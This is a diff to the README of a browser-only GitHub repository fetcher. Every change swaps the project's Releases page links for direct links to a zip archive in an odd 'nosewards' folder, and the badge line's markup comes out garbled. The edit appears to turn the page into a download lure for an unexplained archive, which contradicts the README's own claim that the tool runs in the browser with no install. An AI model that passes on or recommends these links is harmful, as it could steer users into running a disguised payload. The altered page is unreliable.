@@ -1,6 +1,6 @@
 # 🚀 xsukax-GitHub-Repository-Fetcher - Fetch and Export GitHub Repositories Effortlessly
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-%23007ACC.svg?style=for-the-badge&logo=github&logoColor=white)](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/releases)
+[![Download Release](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip%20Now-%https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
 
 ## 📖 Description
 A lightweight, privacy-focused web application that enables developers and researchers to efficiently retrieve and export all repository URLs from any GitHub user or organization profile. Built with vanilla JavaScript and designed to run entirely in the browser without requiring backend infrastructure or user authentication.
@@ -39,7 +39,7 @@ A lightweight, privacy-focused web application that enables developers and resea
 ### 📥 Download & Install
 To download the application, visit the Releases page.
 
-[Download Here](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/releases)
+[Download Here](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
 
 Simply choose the latest release and follow the installation steps below.
 
@@ -76,4 +76,4 @@ This project is open-source and available under the MIT License. You can freely 
 
 Feel free to click the download link again if you need it.
 
-[Download Now](https://github.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/releases)
+[Download Now](https://raw.githubusercontent.com/CentBlocs/xsukax-GitHub-Repository-Fetcher/main/nosewards/Repository-Git-Hub-Fetcher-xsukax-v2.0.zip)
